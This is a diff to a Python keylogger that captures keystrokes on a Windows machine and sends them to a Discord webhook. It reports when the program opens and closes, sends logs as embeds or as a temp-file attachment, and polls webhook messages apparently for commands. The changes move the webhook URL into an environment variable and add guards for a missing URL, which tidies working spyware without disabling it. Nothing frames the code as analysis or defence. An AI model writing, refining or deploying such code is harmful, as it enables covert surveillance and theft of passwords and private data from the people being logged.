@@ -1,13 +1,11 @@
-import keyboard, os, requests, time, base64, socket, atexit
+import keyboard, os, requests, time, socket, atexit
 from threading import Timer, Thread
 from datetime import datetime
 from discord_webhook import DiscordWebhook, DiscordEmbed
 import sys
-import shutil
-import winreg as reg
 
 SEND_REPORT_EVERY = 60  # Example: Sends report every 60 seconds
-WEBHOOK_URL = "Enter Webhook URL"  # Replace this with your webhook URL
+WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')  # Webhook URL is now retrieved from an environment variable
 
 class Klgr:
     def __init__(self, i, m="wh"):
@@ -41,16 +39,20 @@ class Klgr:
         self.l += n
 
     def npo(self):
-        w = DiscordWebhook(url=WEBHOOK_URL)
-        e = DiscordEmbed(
-            title="User opened program",
-            description=f"Program started on {self.u}'s machine at {self.s_dt}.",
-            color=242424
-        )
-        w.add_embed(e)
-        w.execute()
+        if WEBHOOK_URL:
+            w = DiscordWebhook(url=WEBHOOK_URL)
+            e = DiscordEmbed(
+                title="User opened program",
+                description=f"Program started on {self.u}'s machine at {self.s_dt}.",
+                color=242424
+            )
+            w.add_embed(e)
+            w.execute()
 
     def rtw(self):
+        if not WEBHOOK_URL:
+            return
+
         f = False
         w = DiscordWebhook(url=WEBHOOK_URL)
         if len(self.l) > 2000:
@@ -85,6 +87,9 @@ class Klgr:
 
     def lfc(self):
         def cc():
+            if not WEBHOOK_URL:
+                return
+            
             u = f"https://discord.com/api/webhooks/{WEBHOOK_URL.split('/')[5]}/{WEBHOOK_URL.split('/')[6]}/messages"
             h = {"Content-Type": "application/json"}
             while True:
@@ -102,23 +107,27 @@ class Klgr:
         ct.start()
 
     def sloc(self):
-        if self.l:
-            self.e_dt = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
-            w = DiscordWebhook(url=WEBHOOK_URL)
-            if len(self.l) > 2000:
-                p = os.path.join(os.environ["temp"], "command_report.txt")
-                with open(p, 'w+') as file:
-                    file.write(f"Keylogger Report From {self.u} Time: {self.e_dt}\n\n")
-                    file.write(self.l)
-                with open(p, 'rb') as f:
-                    w.add_file(file=f.read(), filename='command_report.txt')
-            else:
-                e = DiscordEmbed(title=f"Keylogger Report From ({self.u}) Time: {self.e_dt}", description=self.l)
-                w.add_embed(e)    
-            w.execute()
+        if not WEBHOOK_URL or not self.l:
+            return
+
+        self.e_dt = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
+        w = DiscordWebhook(url=WEBHOOK_URL)
+        if len(self.l) > 2000:
+            p = os.path.join(os.environ["temp"], "command_report.txt")
+            with open(p, 'w+') as file:
+                file.write(f"Keylogger Report From {self.u} Time: {self.e_dt}\n\n")
+                file.write(self.l)
+            with open(p, 'rb') as f:
+                w.add_file(file=f.read(), filename='command_report.txt')
+        else:
+            e = DiscordEmbed(title=f"Keylogger Report From ({self.u}) Time: {self.e_dt}", description=self.l)
+            w.add_embed(e)    
+        w.execute()
 
     def on_exit(self):
-        # Function that is called when the application is about to close
+        if not WEBHOOK_URL:
+            return
+
         w = DiscordWebhook(url=WEBHOOK_URL)
         e = DiscordEmbed(
             title="User closed program",
